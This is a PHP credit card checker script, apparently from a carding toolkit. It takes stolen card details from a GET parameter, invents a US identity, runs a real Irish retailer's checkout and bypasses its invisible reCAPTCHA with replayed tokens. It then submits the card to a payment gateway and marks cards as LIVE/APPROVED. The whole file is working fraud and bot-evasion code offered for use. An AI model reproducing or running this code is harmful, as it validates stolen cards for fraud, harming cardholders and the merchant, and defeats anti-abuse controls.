<?php
    error_reporting(0);
    $time_start = microtime(true);

    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }

    function RandomString($length = 7)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $cc = $separator[0];
    $mm = $separator[1];
    $yy = $separator[2];
    $cvv = $separator[3];
    $cookie = RandomString();

    $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $postcode = GetStr($local, $state." ", '"');
    $phone = str_replace("-", "", $data['phone']);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.airimpact.ie/basket-detail/add/?mzitmcode=3025-18&mzitmqty=1&mzcurrentListID=&mz_ProdConfigOn=no',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.airimpact.ie/checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        )
    ));
    $bulhog = curl_exec($ch);
    curl_close($ch);
    $mz_shipRegSel = GetStr(GetStr($bulhog, '<select name="mz_shipRegSel" id="mz_shipRegSel">', '</select>'), '<option value="', '"');
    $mz_currencySel = GetStr(GetStr($bulhog, '<select name="mz_currencySel" id="mz_currencySel">', '</select>'), '<option value="', '"');
    $mz_currCurrency = GetStr($bulhog, '<input type="hidden" name="mz_currCurrency" id="mz_currCurrency" value="', '"');
    $sid = GetStr($bulhog, '<input type="hidden" name="sid" value="', '"');
    $labFormSubmitted_UniqueID = GetStr($bulhog, "<input name='labFormSubmitted_UniqueID' id='labFormSubmitted_UniqueID' type='hidden' value='", "'");

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.airimpact.ie/checkout',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mz_shipRegSel=$mz_shipRegSel&mz_currencySel=$mz_currencySel&mz_currCurrency=$mz_currCurrency&mz_currBasketAvailable=YES&sid=$sid&site=demoshop&productsPerPage=10&channel=AirImpact&query=&labFormSubmitted=yes&labFormSubmitted_UniqueID=$labFormSubmitted_UniqueID&labInputemail=$fname$lname@gmail.com&labInputpassword=&mz_MainMenuIntOpt=%3Cli+class%3D%27mz_intlOptions%27%3E%3Ca+href%3D%27%23%27%3E%3Cb%3EInternational+Options%3A%3C%2Fb%3E+%3Cspan+class%3D%27mz_shipReg%27%3E%3Cimg+src%3D%27%2FContent%2Fwebsites%2Fimages%2Fflags%2F4x3%2Fie.svg%27+class%3D%27mz_flagIcon%27+alt%3D%27Ireland%27+%2F%3E+Ireland%3C%2Fspan%3E+%2F+%3Cspan+class%3D%27mz_currency%27%3E%E2%82%AC+EUR%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fli%3E%27%29"
    ));
    curl_exec($ch);
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.airimpact.ie/checkout/delivery/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mz_shipRegSel=$mz_shipRegSel&mz_currencySel=$mz_currencySel&mz_currCurrency=$mz_currCurrency&mz_currBasketAvailable=YES&sid=$sid&site=demoshop&productsPerPage=10&channel=AirImpact&query=&labFormSubmitted=yes&labFormSubmitted_UniqueID=$labFormSubmitted_UniqueID&delColl=storeColl&labInputShippingFirstName=&labInputShippingLastName=&labInputShippingCompanyName=&labInputShippingPhoneDay=&labInputShippingAddress1=&labInputShippingAddress2=&labInputShippingAddress3=&labInputShippingAddress4=&labInputShippingAddressPostCode=&labInputComments=&labInputCollectFirstName=$fname&labInputCollectLastName=$lname&labInputCollectCompanyName=&labInputCollectPhoneDay=$phone&mz_ordTerms=on&mz_MainMenuIntOpt=%3Cli+class%3D%27mz_intlOptions%27%3E%3Ca+href%3D%27%23%27%3E%3Cb%3EInternational+Options%3A%3C%2Fb%3E+%3Cspan+class%3D%27mz_shipReg%27%3E%3Cimg+src%3D%27%2FContent%2Fwebsites%2Fimages%2Fflags%2F4x3%2Fie.svg%27+class%3D%27mz_flagIcon%27+alt%3D%27Ireland%27+%2F%3E+Ireland%3C%2Fspan%3E+%2F+%3Cspan+class%3D%27mz_currency%27%3E%E2%82%AC+EUR%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fli%3E%27%29"
    ));
    curl_exec($ch);
    curl_close($ch);

    $anchor_link = 'https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ&co=aHR0cDovL2xvY2FsaG9zdDo4MA..&hl=en&v=5mNs27FP3uLBP3KBPib88r1g&size=invisible&cb=oanim8ar8tg9';
    $reload_link = 'https://www.google.com/recaptcha/api2/reload?k=6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ'; // It looks like: reload?k=
    $v   = '5mNs27FP3uLBP3KBPib88r1g';  // Available in Anchor Query String Parameters
    $k   = '6Lcx2K4UAAAAAKSBoX_7SubEQnfjWOs7lKHArUkQ';  // Available in Anchor Query String Parameters
    $co  = 'aHR0cDovL2xvY2FsaG9zdDo4MA..';  // Available in Anchor Query String Parameters
    $chr = urlencode('[99,54,16]');  // Available in Reload's Request Payload (Post Field) and looks like: [21,71,92]
    $bg  = '!JSOgI27IAAYe7ljdHu5HaZz6jv8WH4I-ACkAIwj8RmXCHxkMwn4-reCFidA5aTIda4bNZIXlq4cQ8N4Qda2wNgRF0gcAAACUVwAAAAZtAQecCpUQ7cFcsj_YNhESXkyE1Entz5A5dIQkA1Pbxtu-6CMpvIjlaz_7WdbR3pJNbXuZ82ojaRkCQIekhQjfx1-ftp3k_dDB_KFB_ZxLeShgVGfUR1wga0sfdNEbvk_CSrhK9SA3KMUHqIq8xbQlw7hHA3isj7vro_ThpVQe-3vTJd4sdpGruvokOZWE5oNbQvP1R5G7oRH6N8Sx7HRPFFo8MtooCf4UsfuqHwk9dhBpIQJ5pQwA7XG_xhxB1MQulB4xPGykllKX71X4Q2TZSSlOOnWzE5KOzpPL8B3mGoxNo2EOTr54axXFYyGmn6mcFZ0_ZQwdmEUMGzDTffSodjHuh3samCzWSoKzqnRkLzbWwSYmup9ElUJ-4DFOwSG1H7Cp5ymPj55auljmapG4BwRH6Jgud231aPH2BY5Xg5SXagf91bGpVYqtPoT1OfLNVqQ6SeMS0hbq2fBQAQftS80v3qa745c9AOIOBAfgqX0B2yN-Lo7IpUMNgOSB4jdKOU_8iL8KMLpwoUeASBViVZ4Flr-8t-h7E9TB2lMSDUc9_XK_ynYWHISritLTWtRNm91G2LxeGHYEmx0905HISpoUL3AuSlcBRwg2GfIiTXM7Tj53nWU726IuRw4djJ1716lLYSSnokCwzYWBDg6s5cJxjMwQYK2CJNpzMTb47XjvtkoCmNLSkYT3INlmHI4SOiqRHIJB4myHt7eqPkJ5_gKmiYQ1g4C668J_IXLxOiMVHYu-4f3qofj-2bMOaGpW2UsNlHe0rWLMojcgt24Rag157LKA_Pk-gGqxzjLCfHUii4eAc9ZhaItTpsvBrdTUfRkpQVsaRQPJsstsRFm5zC6JE-oRLkzelQA0FjCt4VaUW2hKT4R1XbC6DjkesZMsoWeJI9PsA3JK7dWy0c9CEwi3ySV5Bhc3D46A9cnSvjJ_y_JQUsQaNStPL3Su4GVTJ6zCxHgBZ_tAHLVrGG7ckH3z3ANXb9ljyeVKtiJLb5mFH8xVWJsDP2ELYtTYcgYu5ZuVn7oDLfP12p01NX1ZfhXy1AjNQMptJ0FK0MtMgvaPEc3syIrgpJrLvi2WCPNItjctruzOetcTNirXmApNbcM2jEBy8G53Zttaz1aV5YP6vo0LuA52CAj09UN5xLeF8zxjLylZjDCOV7FbnKbxDLaJcq7KKcokLY4Ka3S7an4C7-WKPIQFxiRX5di6vhcpDOZM5hEh8wobjrgOUQQC8vXTSYp_YS9qyOmedPFCNuI3JK-WbhVUJNdLsrcCXvVO_j90l0_UrSAfQUDwABxQ4sUgyA6K81NnH5hlYD-EgxpnrZNVnUSkpZW8gbSi8PnLPRnOxp7HGhKbx2P708YRYMyNpCoHjHMuAO2pUja5Qvnd0sG-rGSM8TUxKDj9a9CZZuojgizNannWL9Xvc1Lw2cZGmW4IbjH3_DYvCqYG-DlL5S8_7mbGKImlsN1hL9G4ml0rpHE_qei3awAvt_Ad3Sd4gddQ4IadthcrvA8Sa9DsH2jd8_PjghtKXD12p13QU3aLanlrZUX1nxVbAOOKm9F_4RFVX0Irsw8zsO508fSIPlZcmySmNFOlJJJ-IRNxwTAB6KDg3KPSeI_2cUKJAKrBu-DYxh188hnLYQvynsTjMF7Sg9LgV-PTtwYIIiVWIv4DjgVEBWvOmdNpUia0VBQP4s2vChnWv1LzslPbVnUjif8Oe5KlXaXXijCYeds2WN13UaglBX0PvU1OjHghwmkI0i-tzCDBScQJOkg8OMRbt-LffAwanSMncDnAlF5j50RsEDCtJD9-Ea7qxjfLtqrfzbemSiNOFxzd8OMjuE9QxLVYW60OBPeIb5BBnJv5AlrUoPzd_zO2K6P4TR2pxVUu3P5xX1bHWtKaK0Gq5Qk-stpSku8JlcpRVjb_x1KyaD45MM0iCSoCkSUKtISwsRnR632pX4whOKloGa2fOAnnWL84kB7EE2e7dZQSvvX9jpa6PTMVTQm_i-7L3H5aNNGbqOjIS9qU4gpTH7Y49t1gfY47__YdeDwBmwzEeNb1SLiXU3DuwLlsh75oFzhkTjQGILKgCjkCTcGer4BEigXiCJtlw8w8n5EkbDm0ASUjqQE6cZGqwUnjuvdF2n3xHrhJ2lPJlF-cCUu1wH4M3VvBdbcq3eMysn_2RGIgMSs4-OBPQASIwFntkpydDUlYYeY8_CKu4SOLObCSTHrvV8KCJrDkGNlVhn9ffIqMtL41lnG42n8SzuGzdjIV8gGP2zzH_rMof2yUpJyy0QK7hqj5jm6A3679jCo9Bq38ygbp2QymsBWOIljb7Cj496xotULvqnLhTzxL1Sylpl9HChgjDgJ3h1Pp2R4wku4Un9mbqRNEuTw3oXmtdsgV0kAWc-skMaXUYNHQe80c6CVosMvjKbDdq7y_i9TA-PT7VsEL9uwetQTX2MELRCp48w_Zg4j15PRr9sSZbHV6VjcJ5KL4cLZhoGELH5jEDqP_LogX-GXtipYhLzIIRW61XcyPXEUpPKvPJAvKgJ-W95dB6WpgsPTPmeANLWL_AawSLqHrxiwgwKX2jdvjQrKJbTV7xXBxEQSU_mwhKoM8oZ7eDL-dpZaOyR8e3ZF6OKZAUe6ie6vEey6cBKz3JX_-UAoZX_pi6x7WmL6JrqxbRJAmfprMbklxkUpcXaTqbo2m1ilEjZ7Q65Fw6SmF9e7SEbyKKxqf7v1mN9TI2lVdgMaPmafpUpG9T38i7D-LXHTS-07memzg1KddeePnDfKO2WY5Hoyv6pkdloW6AoJAgcqAJ0_GitYDrIHE_YgAe5kWTG23aTUi7E6OkjQSoeL3Iopf2Zs6msJ04t_gKfbQRoqu5tZwgLWY7VnzQ-3LK3IwqoqC_0X2poF5G6nPwZyP_DEUA4MDROnkA0WUxk1PLgTZ-Jo_jGSp3L4-UV8QGNMGXo214tghoSLo4BcbB-v6wCJNnESKfkgTeTkfSsVaJgEmrywepsbDZuU3mYCavWVaRYjPfM6eS8NxCAUHkijCi3qX1jLjjG1rtia75nZVuqDMYDpcGFmYHW-FKlb55w5xazPNO6qLSIhwYSSTipspCU4xuKvsN1gpI99zyHszR0LqYG_f1BrzPRYgPEiRvrZVI01D2mr1_eyMTyGedlPhYPEXEQTfHqQ8jB__IMHbc7NOdanAY_jWdNGbXSwdVfg5advCdG3buz8ct_JqeUg7sQEodElG1syaX5UP3BoNHN3hXgnfAcCuWbILUVxZ0_8pmHV-Wcsu5z3RO5slXi5E8peB74eVwrwrc1Fyc3ZDXJBp6a9BKKFpMT3i3y4yWa9LCj2xTUjeJlEkrmKp6JJW1SJyd9xW-fPrEV7iUBaMXPNFkpVPzBNOJ0Em3KrLSg13F9qezjowSHpYmswuKmrB_7SODgouDKAtEOWUMCvjc1B6AnPZtNuNVUlFVqHvN-ldigEtXmijHszlryrwLHdlnZwYGVkgMv2l4EZi3Uu1OMqwQpqyTSXoVBS0aDgp_77ufBmXFYKtOSEcsyTWoYxpJM_uoyuoxgjvTOyVlPO0qlvN25Rp3EdznWFtZy7mjnizZ3dPPOyxyMuRuWsLiW7RlFdGzu3xTeBlekIOrHM';  // Available in Reload's Request Payload and is after the $chr and it starts from ! and ends with * (Exclude *)
    $vh  = '18186122242';  // Available in Reload's Request Payload and is after the $bg and select only the number (Sometimes - sign is also included in number, you have to take that - sign also)

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $anchor_link,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99)
        )
    ));
    $rtk = GetStr(curl_exec($ch), 'type="hidden" id="recaptcha-token" value="', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $reload_link,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_HTTPHEADER => array(
            'accept: */*',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99)
        ),
        CURLOPT_POSTFIELDS => "v=$v&reason=q&c=$rtk&k=$k&co=$co&hl=en&size=invisible&chr=$chr&vh=$vh&bg=$bg"
    ));
    $captcha = GetStr(curl_exec($ch), '"rresp","', '"');
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.airimpact.ie/checkout/delivery/',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=$captcha&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mz_shipRegSel=$mz_shipRegSel&mz_currencySel=$mz_currencySel&mz_currCurrency=$mz_currCurrency&mz_currBasketAvailable=YES&sid=$sid&site=demoshop&productsPerPage=10&channel=AirImpact&query=&labFormSubmitted=yes&labFormSubmitted_UniqueID=$labFormSubmitted_UniqueID&delColl=storeColl&labInputShippingFirstName=&labInputShippingLastName=&labInputShippingCompanyName=&labInputShippingPhoneDay=&labInputShippingAddress1=&labInputShippingAddress2=&labInputShippingAddress3=&labInputShippingAddress4=&labInputShippingAddressPostCode=&labInputComments=&labInputCollectFirstName=$fname&labInputCollectLastName=$lname&labInputCollectCompanyName=&labInputCollectPhoneDay=$phone&mz_ordTerms=on&mz_MainMenuIntOpt=%3Cli+class%3D%27mz_intlOptions%27%3E%3Ca+href%3D%27%23%27%3E%3Cb%3EInternational+Options%3A%3C%2Fb%3E+%3Cspan+class%3D%27mz_shipReg%27%3E%3Cimg+src%3D%27%2FContent%2Fwebsites%2Fimages%2Fflags%2F4x3%2Fie.svg%27+class%3D%27mz_flagIcon%27+alt%3D%27Ireland%27+%2F%3E+Ireland%3C%2Fspan%3E+%2F+%3Cspan+class%3D%27mz_currency%27%3E%E2%82%AC+EUR%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fli%3E%27%29"
    ));
    foreach(explode("<input type=\"hidden\"", GetStr(curl_exec($ch), '<div class="mz_secureCC"></div>', '<label for="cardnumber"')) as $values){
        $form[GetStr($values, 'name="','"')] = GetStr($values, 'value="','"');
    }
    curl_close($ch);

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => 'https://www.ipg-online.com/connect/gateway/processing',
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => array(
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'content-type: application/x-www-form-urlencoded',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
        ),
        CURLOPT_POSTFIELDS => "IsAdminUser=FALSE&IsSuperUser=FALSE&mzcurrentListID=&mzgooReCapToken=&tinyAllowHTMLEdit=FALSE&mz_ignoreSaveToHistory=FALSE&mz_shipRegSel=$mz_shipRegSel&mz_currencySel=$mz_currencySel&mz_currCurrency=$mz_currCurrency&mz_currBasketAvailable=YES&sid=$sid&site=demoshop&productsPerPage=10&channel=AirImpact&query=&".http_build_query($form)."&cardnumber=$cc&bname=$fname+$lname&expmonth=".ltrim($mm, "0")."&expyear=$yy&cvm=$cvv&mz_MainMenuIntOpt=%3Cli+class%3D%27mz_intlOptions%27%3E%3Ca+href%3D%27%23%27%3E%3Cb%3EInternational+Options%3A%3C%2Fb%3E+%3Cspan+class%3D%27mz_shipReg%27%3E%3Cimg+src%3D%27%2FContent%2Fwebsites%2Fimages%2Fflags%2F4x3%2Fie.svg%27+class%3D%27mz_flagIcon%27+alt%3D%27Ireland%27+%2F%3E+Ireland%3C%2Fspan%3E+%2F+%3Cspan+class%3D%27mz_currency%27%3E%E2%82%AC+EUR%3C%2Fspan%3E%3C%2Fa%3E%3C%2Fli%3E%27%29"
    ));
    $bolbol = curl_exec($ch);
    curl_close($ch);

    $status = GetStr(GetStr($bolbol, 'name="fail_reason">', 'name="status">'), 'value="', '"');
    $response = GetStr(GetStr($bolbol, 'name="email">', 'name="approval_code">'), 'value="', '"');

    if(strpos($bolbol, 'APPROVED')) {

        echo '<tr><td><span class="badge badge-success badge-pill">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">APPROVED</span></td></tr><br>';

    } else {

        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'</span></td> <td><span class="badge badge-info badge-pill">Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';

    }
    unlink("cookies/$cookie.txt");
?>